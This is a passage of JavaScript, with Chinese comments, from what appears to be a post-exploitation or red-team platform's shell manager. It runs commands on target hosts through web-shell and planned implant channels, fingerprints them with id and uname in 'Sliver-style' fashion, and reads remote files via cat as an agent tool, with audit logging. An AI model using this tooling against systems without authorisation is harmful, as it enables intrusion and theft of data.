            res.err, res.so, res.se, '[timeout: 宿主侧进程已被 timeout(1) 终止]', 'sh 降级(docker 缺席, 宿主直跑——无容器隔离)'));
          // r9-D10: 降级注记是元数据——进独立字段, 不再混入 stdout 载荷
          // (read_file 的 content 曾被污染)。
          degradedNote = 'docker 缺席, 实际跑在宿主而非 ' + cbox + ' 容器';
        }
      } else {
        return { ok: false, error: `transport ${sh.transport} 未接入(真实植入通道后续挂)` };
      }
    } catch (e) {
      return { ok: false, error: 'exec 异常: ' + e.message };
    }
    sh.cmdCount += 1; sh.lastActiveAt = new Date().toISOString();
    // loop39-R48b: verifyMark 自愈重试的任务史打 retry 标(读数友好,
    // 审计保留——R48b 裁定采纳)。
    const isRetry = /^printf 'WM[a-z0-9]+S';/.test(command);
    const task = { n: sh.cmdCount, command: command.slice(0, 500), code, ms: Date.now() - t0, at: sh.lastActiveAt,
      ...(isRetry ? { retry: true } : {}) };
    sh.tasks.push(task);
    persistShells();  // R6-F2: every-mutation 契约
    if (sh.tasks.length > 100) sh.tasks.splice(0, sh.tasks.length - 100);
    audit('shell-exec', { id, target: sh.target, cmd: command.slice(0, 120), code, ms: task.ms });
    return { ok: code === 0, stdout: stdout.slice(0, MAX_OUT), stderr: stderr.slice(0, MAX_OUT), code, ms: task.ms, task, ...(degradedNote ? { degradedNote } : {}), ...(layerNote ? { layerNote } : {}) };
  }

  /** Auto-fingerprint the host once (whoami/uname) — Sliver-style session meta. */
  async function fingerprint(id) {
    const sh = shells.get(id);
    if (!sh || sh.host) return sh;
    // 自测r3(指纹污染): 输出带定界哨兵——非定界 200 响应(错误页/HTML)
    // 此前原样进 user 字段(实测 user="<html>…")。
    const u = await exec(id,
      'printf "__SPF1__"; id -un 2>/dev/null; printf "__SPF2__"; uname -a 2>/dev/null | head -1; printf "__SPF3__"');
    if (u.ok) {
      const m1 = String(u.stdout).indexOf('__SPF1__');
      const m2 = String(u.stdout).indexOf('__SPF2__');
      const m3 = String(u.stdout).indexOf('__SPF3__');
      const raw = String(u.stdout);
      const clean = (a, b) => (a >= 0 && b > a ? raw.slice(a + 8, b) : '');
      let user, osLine;
      if (m1 >= 0 && m3 > m1) {
        user = clean(m1, m2).split('\n')[0];
        osLine = clean(m2, m3);
        // r6v2-#4: 哨兵齐全分支同样过形态白名单(标记间夹带编码/回显
        // 残渣此前直入 user)
        if (!/^[A-Za-z0-9._-]{1,32}$/.test(user)) user = '';
      } else {
        // EW-2: 哨兵残缺的响应(截断/污染)——剥哨兵后取首行, 非打印/
        // HTML 形态直接判污染置空(r4 实测 user 残留哨兵)。
        // r6-#4: 递归回显(响应把命令文本原样/URL 编码回显)——先剥编码
        // 形态哨兵, 再尝试 decode 一次, 白名单不过即判污染置空。
        let stripped = raw.replace(/__SPF\d__/g, '')
          .replace(/%5F%5FSPF|%5f%5fSPF/gi, '__SPF').replace(/__SPF\d+__/gi, '')
          .split('\n')[0].trim();
        if (/%[0-9a-f]{2}/i.test(stripped)) {
          try { stripped = decodeURIComponent(stripped).replace(/__SPF\d+/g, '').trim(); } catch { /* 保原值走白名单 */ }
        }
        user = /^[A-Za-z0-9._-]{1,32}$/.test(stripped) ? stripped : '';
        osLine = '';
      }
      sh.user = (user || '').trim().slice(0, 64) || null;
      // r6v3-#4: os 同过形态白名单——可打印 ASCII, 禁编码/HTML 形态
      const osClean = (osLine ?? '').trim();
      // r8-D3: uname 全串实测 ~130 字符, 上限 120 曾误杀→os 恒 null
      sh.os = (/^[\x20-\x7e]{4,200}$/.test(osClean) && !/[<>%]/.test(osClean))
        ? osClean : null;
      sh.host = sh.os ? String(sh.os).split(' ')[1] : null;
      persistShells();  // R6-F2
    }
    return sh;
  }

  /** Convenience: read one file through the shell (cat), for agent tool. */
  async function readFile(id, path, opts = {}) {
    // r9-D9: 状态前置检查与 exec 同文案——closed/expired 通道此前返回
    // {"ok":false,"content":""} 无说明, 首测即被坑(形态不一致)。
    const sh0 = shells.get(id);
    if (!sh0) return { ok: false, error: 'shell 不存在' };
    if (sh0.status !== 'active') return { ok: false, error: `shell 状态 ${sh0.status}(read_file 与 exec 同判)` };
    // R6-F4: 单引号安全转义(双引号内 $()/反引号会展开, path 即注入
    // 点); cat 退出码经 PIPESTATUS 传播——读失败不再被 head 的恒 0
    // 吞掉, 错误文本仍在 stdout 可诊断。
    const q = "'" + String(path).replace(/'/g, `'\\''`) + "'";
    // loop37-D2: verifyMark 透传(web 通道 read_file 与 exec 同管道,
    // 一拍滞后行为一致——seq=7329 补证)。
    const r = await exec(id,
      `o=$(cat -- ${q} 2>&1); c=$?; printf %s "$o" | head -c 65536; exit $c`, opts);
    return r;
  }

  return { register, list, get, close, exec, readFile, gate, fingerprint };
}
